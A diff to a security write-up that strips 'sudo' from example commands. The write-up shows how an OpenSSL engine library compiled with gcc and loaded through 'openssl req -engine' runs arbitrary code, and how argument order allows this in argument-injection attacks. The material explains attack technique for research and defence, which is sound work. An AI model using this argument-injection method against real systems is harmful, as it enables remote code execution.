@@ -52,11 +52,11 @@ Compile it using the following gcc command, which will create the `engine.so` sh
 `gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o`
 
 and then use the following OpenSSL command:
-`sudo openssl req -engine ~/engine.so`
+`openssl req -engine ~/engine.so`
 
 which will output the following:
 ```
-user@debian10:~$ sudo openssl req -engine ~/engine.so
+user@debian10:~$ openssl req -engine ~/engine.so
 arbitrary code
 engine "rce" set.
 ```
@@ -84,14 +84,14 @@ and probably some more, just check the man page.
 Exploiting these in argument injection vulnerabilities isn't always trivial as just injecting the engine parameter, as depending on the position of the injected argument you may also need to have a valid set of OpenSSL arguments. Interestingly enough the engine seems to be loaded even if the other Openssl args are invalid, as long as the engine argument preceeds the invalid argument. So we see:
 
 ```
-user@debian10:~$ sudo openssl req INVALID -engine ~/engine.so
+user@debian10:~$ openssl req INVALID -engine ~/engine.so
 req: Use -help for summary.
 user@debian10:~$  
 
 ```
 doesn't work, however the following does:
 ```
-user@debian10:~$ sudo openssl req -engine ~/engine.so INVALID
+user@debian10:~$ openssl req -engine ~/engine.so INVALID
 arbitrary code
 engine "rce" set.
 req: Use -help for summary.
